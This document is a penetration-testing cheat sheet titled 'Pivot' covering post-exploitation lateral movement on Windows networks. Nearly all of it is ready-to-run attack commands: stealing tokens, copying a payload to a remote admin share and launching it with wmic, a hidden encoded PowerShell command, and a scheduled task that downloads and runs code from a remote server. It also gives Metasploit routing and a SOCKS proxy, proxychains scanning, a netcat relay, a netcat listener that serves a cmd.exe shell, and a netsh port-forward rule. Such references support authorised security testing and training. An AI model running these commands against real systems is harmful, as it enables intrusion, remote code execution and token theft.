---
title: Pivot
category: Post-Exploitation
order: 97
---


>**Windows**

{% highlight bash %}
> whoami or sets
> net user [username] /domain

#If you didn't land on an account you want try
meterpreter > use incognito
cobalt strike > Explore Processes and Steal Token
incognito > find_token.exe

#An executable or bat file
> net use \\WIN-K5QAGP4CM7V\C$
> copy C:\wamp64\bin\php\payload.exe \\WIN-K5QAGP4CM7V\C$\Users\PUblic\Music\payload.exe
>  wmic /node:"WIN-K5QAGP4CM7V" process call create "C:\Users\PUblic\Music\payload.exe"

#WMIC and Powershell
> wmic /node:"WIN-K5QAGP4CM7V" process call create "powershell.exe -nop -w hidden -encodedcommand [encodedcommand]"

#Scheduled Task and Powershell
> schtasks /create /tn ScoreBoard /s 10.4.0.100 /tr "C:\windows\system32\WindowsPowerShell\V1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://10.128.0.11:8000/page'''))'" /sc MINUTE /st 12:53
{% endhighlight %}

>**Metasploit and Meterpreter**

{% highlight bash %}
meterpreter> ipconfig 
Broadcom 440x 10/100 Integrated Controller - Packet Scheduler Miniport
Hardware MAC: 00:0b:db:1d:d3:2b
IP Address : 192.168.15.3
Netmask : 255.255.255.0

meterpreter > run arp_scanner -r 192.168.15.1/24
[*] ARP Scanning 192.168.15.1/24
[*] IP: 192.168.15.5 MAC d8:d3:85:ff:ff:ff
[*] IP: 192.168.15.5 MAC d8:d3:85:ff:ff:ff

route add 192.168.15.1 255.255.255.0 1

msf exploit(handler) > use auxiliary/scanner/portscan/tcp
msf auxiliary(tcp) > set RHOSTS 192.168.15.1
RHOSTS => 192.168.15.1
msf auxiliary(tcp) > set PORTS 1-1024
PORTS => 1-1024

msf auxiliary(tcp) > use auxiliary/server/socks4a
msf auxiliary(socks4a) > show options
msf auxiliary(socks4a) > set SRVHOST 159.203.173.82
SRVHOST => 159.203.173.82
msf auxiliary(socks4a) > run
{% endhighlight %}

* Proxy Chain Configuration:

{% highlight bash %}
vi /etc/proxychains.conf 
#comment out DNS
#Change sock4 to:
socks4 [IP of Attack Machine] [PORT of attach machine]

proxychains nmap -sT -P0 10.0.0.10

{% endhighlight %}

> **Netcat Relay** 

Relay | <code> Mknod backpipe p <br> nc -l -p [allowed_inbound_port] 0<backpipe | nc 127.0.0.1 22 1>backpipe <br> ssh login@[target] -p [allowed_inbound_port] </code>
Remote Netcat (detached) | <code> nc.exe -d -l -p 4444 -e cmd.exe </code>

> **netsh pivot** 

netsh interface portproxy add v4tov4 listenport=<LPORT> listenaddress=0.0.0.0 connectport=<RPORT> connectaddress=<RHOST>

> **useful resources** 

* [incognito](https://labs.mwrinfosecurity.com/tools/incognito/)
* [powershell token](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1)
* [SSH Cheat Sheet](http://pentestmonkey.net/cheat-sheet/ssh-cheat-sheet)
* [Meterpreter Pivot](https://pen-testing.sans.org/blog/2012/04/26/got-meterpreter-pivot)
* [Nessus through Proxy](https://blog.elearnsecurity.com/nessus-and-metasploit-scan-networks-in-pivoting.html)
* [SSH Pivot](http://pwnwiki.io/#!pivoting/linux/index.md)


